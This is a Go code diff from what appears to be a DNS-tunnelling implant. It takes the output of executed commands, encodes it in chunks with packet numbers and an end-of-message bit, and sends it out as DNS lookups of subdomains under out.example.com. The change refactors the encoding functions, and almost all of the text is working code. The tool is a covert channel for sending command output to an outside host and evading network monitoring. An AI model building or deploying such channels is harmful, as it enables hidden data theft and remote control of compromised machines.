@@ -87,11 +87,9 @@ func createCommand(args []string) *exec.Cmd {
 }
 
 func returnResponses(r *net.Resolver, responseChan chan []byte) {
-	var packetNumber uint16 = 0
 	for {
 		cmdOutput := <-responseChan
-		requests := encodeRequests(packetNumber, cmdOutput)
-		packetNumber++
+		requests := encodeRequests(cmdOutput)
 		for i, request := range requests {
 			fmt.Println(i, " ", request)
 			r.LookupHost(context.Background(), request)
@@ -99,44 +97,9 @@ func returnResponses(r *net.Resolver, responseChan chan []byte) {
 	}
 }
 
-func encodeDNSRequests(packetNumber uint16, cmdOutput []byte) []string {
-	fmt.Println("cmd result: ", string(cmdOutput))
+func encodeRequests(cmdOutput []byte) []string {
 	var requests []string
-	var b strings.Builder
-	nLevels := len(cmdOutput) / 32
-	for i := 0; i < nLevels; i++ {
-		if i%3 == 0 {
-			if i != 0 {
-				//we need to create a new request
-				b.WriteString("out.example.com")
-				requests = append(requests, b.String())
-				b.Reset()
-			}
-			//first level
-			buf := new(bytes.Buffer)
-			binary.Write(buf, binary.BigEndian, packetNumber)
-			bytes := buf.Bytes()
-			bytes[0] = bytes[0] & 127
-			//update the msb if this is the last request
-			if i+3 >= nLevels {
-				bytes[0] = bytes[0] | 128
-			}
-
-			fmt.Printf("% b", bytes)
-			fmt.Printf("\n")
-			//b.WriteString(basen.Base62Encoding.EncodeToString(append(bytes, []byte(cmd[i])...)))
-		} else {
-			//b.WriteString(basen.Base62Encoding.EncodeToString([]byte(cmd[i])))
-		}
-		b.WriteString(".")
-	}
-	b.WriteString("out.example.com")
-	requests = append(requests, b.String())
-	return requests
-}
-
-func encodeRequests(packetNumber uint16, cmdOutput []byte) []string {
-	var requests []string
+	var packetNumber uint16 = 0
 	var builder strings.Builder
 	//Bytes for the current level (max 32)
 	var levelBytes []byte
@@ -153,6 +116,7 @@ func encodeRequests(packetNumber uint16, cmdOutput []byte) []string {
 			//first level of the request
 			buf := new(bytes.Buffer)
 			binary.Write(buf, binary.BigEndian, packetNumber)
+			packetNumber++
 			bytes := buf.Bytes()
 			bytes[0] = bytes[0] & 127
 			//update the msb if this is the last request
